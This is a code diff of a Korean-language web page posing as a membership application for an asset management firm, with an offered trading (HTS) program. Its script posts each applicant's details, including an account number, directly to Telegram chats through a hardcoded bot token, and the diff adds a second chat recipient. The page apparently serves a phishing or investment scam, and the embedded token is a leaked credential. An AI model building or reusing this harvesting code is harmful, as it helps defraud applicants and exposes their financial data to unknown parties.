@@ -109,6 +109,15 @@
 			text-align: center;
 			text-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
 		}
+		.downimfo3 {
+			max-width: 960px;
+			margin: auto;
+			background: white;
+			padding: 10px 20px 10px 20px;
+			font-size: 14px;
+			text-align: center;
+			text-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
+		}
         @media (max-width: 767px) {
 			.header {
 				height: 150px;
@@ -131,17 +140,17 @@
 
 			}
 			.downimfo1 {
-
+				text-align: left;
 			}
 			.downimfo2 {
-
+				text-align: left;
 			}
         }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>베스트온 멤버십 신청 888</h1>
+        <h1>베스트온 멤버십 신청 1</h1>
     </div>
 	<div class="topimfo">
 		베스트업 자산운용
@@ -182,7 +191,8 @@
 	<div class="downimfo2">
 		​※ 신청이 완료되면 검수후 고객님의 이메일로 HTS프로그램을 보내드리며 ​추가 문의 사항은 고객센터 상담원을 통해 상담이 가능하십니다
 	</div>
-	<div style="height:20px;">
+	<div class="downimfo3">
+		<br>
 	</div>
     <script>
         $(document).ready(function() {
@@ -230,27 +240,31 @@
                     계좌번호: ${data.accountNumber}
                 `;
 
-                // Replace 'YOUR_TELEGRAM_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual Telegram Bot Token and Chat ID
-                const botToken = '7340037891:AAGRpEijtgsGHplWdDoVWo9mZiI90gGRab8';
-                const chatId = '58166324';
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+				const botToken = '7340037891:AAGRpEijtgsGHplWdDoVWo9mZiI90gGRab8';
+				const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+				const chatIds = ['58166324', '7280832936']; // Array of chat IDs
 
-                $.ajax({
-                    type: "POST",
-                    url: url,
-                    data: {
-                        chat_id: chatId,
-                        text: message
-                    },
-                    success: function(response) {
-                        alert("신청이 성공적으로 접수되었습니다!");
-                        $('form')[0].reset(); // Reset form fields after successful submission
-                    },
-                    error: function(xhr, status, error) {
-                        console.error("Error sending message: ", error);
-                        alert("신청을 처리하는 중 문제가 발생했습니다. 다시 시도해 주세요.");
-                    }
-                });
+				// Send the message to each chat ID
+				chatIds.forEach(chatId => {
+					$.ajax({
+						type: "POST",
+						url: url,
+						data: {
+							chat_id: chatId,
+							text: message
+						},
+						success: function(response) {
+							console.log("Message sent to chat ID:", chatId);
+						},
+						error: function(xhr, status, error) {
+							console.error("Error sending message to chat ID " + chatId + ": ", error);
+						}
+					});
+				});
+
+				// Feedback to user
+				alert("신청이 성공적으로 접수되었습니다!");
+				$('form')[0].reset(); // Reset form fields after successful submission
             });
         });
     </script>
